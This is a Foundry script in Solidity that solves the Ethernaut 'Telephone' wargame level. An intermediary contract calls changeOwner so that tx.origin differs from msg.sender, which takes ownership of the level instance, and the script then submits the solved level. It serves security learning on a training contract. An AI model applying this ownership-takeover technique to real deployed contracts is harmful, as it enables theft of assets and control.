// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneFactory} from "src/04/TelephoneFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console} from "forge-std/Test.sol";

contract TelephoneExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL4_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new TelephoneFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);
        
        // Break the contract
        Exploit exploit = new Exploit();
        exploit.changeOwner(Telephone(instance));

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    function changeOwner(Telephone telephone) external {
        console.log("we here");
        telephone.changeOwner(msg.sender);
    }
}
